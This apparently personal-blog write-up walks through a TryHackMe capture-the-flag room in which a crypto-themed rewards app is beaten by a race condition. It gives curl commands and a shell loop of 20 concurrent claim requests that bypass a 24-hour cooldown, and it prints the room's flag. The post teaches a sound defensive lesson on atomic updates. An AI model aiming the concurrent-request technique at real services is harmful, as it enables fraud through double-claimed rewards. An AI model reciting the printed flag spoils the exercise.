---
title: "TryHackMe - Byte Lotus: Towel on the Sunbed"
date: 2026-08-04
tags: ["TryHackMe", "Race Condition", "Web Security", "Business Logic Flaw"]
excerpt: "A poolside crypto-rewards app gates its daily claim behind a 24-hour cooldown — until 20 concurrent requests show the check and the update aren't the same atomic step."
---

# TryHackMe: Byte Lotus — Towel on the Sunbed

**Room theme:** Ponzi Portfolio, a "wellness rewards" side project running inside the Byte Lotus guest platform — a crypto-flavored daily staking reward with a Whale Vault tier to unlock. The pretext: a guest claims his daily reward, steps away, and comes back to find it's been "claimed three times over" — a strong hint the room is really about a race condition, not an auth bypass.

**Task itinerary:**
- Create a guest account and explore the daily reward mechanism.
- Work out what's standing between you and Whale Vault status.
- Find your way past it and retrieve the flag.

## Recon

The app runs on Node/Express (port 3000), redirecting to `/auth/login`. Reading `auth.js` showed both `/auth/register` and `/auth/login` accept a simple JSON POST:

```
curl -s -c cookies.txt -X POST http://<target>:3000/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"lambo","password":"sunshine1"}'
```

Registration doubles as login — the response redirects straight to `/dashboard`.

## Understanding the reward mechanic

The dashboard page and its `dashboard.js` laid out the whole system plainly:

- `GET /dashboard/api/me` — returns balance, tier, and whether a claim is currently available (`canClaim` / `secondsUntilClaim`).
- `POST /claim` — claims **50 PONZI**, gated to once per 24 hours.
- `GET /vault` — unlocks and returns the flag once balance reaches the **150 PONZI** Whale threshold.

Three legitimate claims, 24 hours apart, would take three days. That's the gap "wide enough to walk a whale through" from the room's flavor text — the claim endpoint's cooldown check was the target.

## Confirming the starting state

```
curl -s -b cookies.txt http://<target>:3000/dashboard/api/me
```

```json
{"balance":0,"tier":"Shrimp","whaleThreshold":150,"canClaim":true,"secondsUntilClaim":0}
```

Fresh account, reward available, balance zero.

## The race condition

A daily-claim endpoint that checks "has this user already claimed today?" and then separately updates the balance/timestamp is a classic TOCTOU (time-of-check to time-of-use) bug if those two steps aren't wrapped in a single atomic operation. Firing many requests at once, before the server can process and persist the first one's "already claimed" state, lets several slip through the gate simultaneously.

```bash
for i in $(seq 1 20); do
  curl -s -b cookies.txt -X POST http://<target>:3000/claim &
done
wait
```

Result: most requests correctly got `"Reward already claimed. Please wait before claiming again."` — but several landed successful claims before the lock caught up:

```
{"message":"Staking reward claimed successfully.","reward":50,"newBalance":100,"tier":"Dolphin",...}
{"message":"Staking reward claimed successfully.","reward":50,"newBalance":200,"tier":"Whale",...}
{"message":"Staking reward claimed successfully.","reward":50,"newBalance":250,"tier":"Whale",...}
{"message":"Staking reward claimed successfully.","reward":50,"newBalance":300,"tier":"Whale",...}
```

Six of the twenty concurrent requests won the race, taking the balance from 0 straight to 300 — double the 150 needed for Whale status — in well under a second.

## Opening the vault

```
curl -s -b cookies.txt http://<target>:3000/vault
```

```json
{"message":"Welcome to the Whale Vault.","flag":"THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}","balance":300}
```

## Flag

```
THM{xxxxx}
```

## Takeaways

- Any "claim once per period" or "one-time action" endpoint needs its check-then-update logic to happen as a single atomic operation (a database transaction, an atomic increment, or a row-level lock) — otherwise it's exploitable by simply firing concurrent requests, no special tooling required beyond a shell `for` loop and `&`.
- Race conditions like this are trivial to test for: register a fresh account, confirm the action is available, then blast it with 15-20 parallel requests and see how many "shouldn't" succeed.
- The flag's own name ("double spent") is a nod to the exact same class of bug that real cryptocurrency double-spend attacks exploit — an action that should be exclusive but isn't properly serialized.
- Client-side countdown timers (like the one in `dashboard.js`) are purely cosmetic — they only disable a button in the browser. The only enforcement that matters is server-side, and here it had a gap.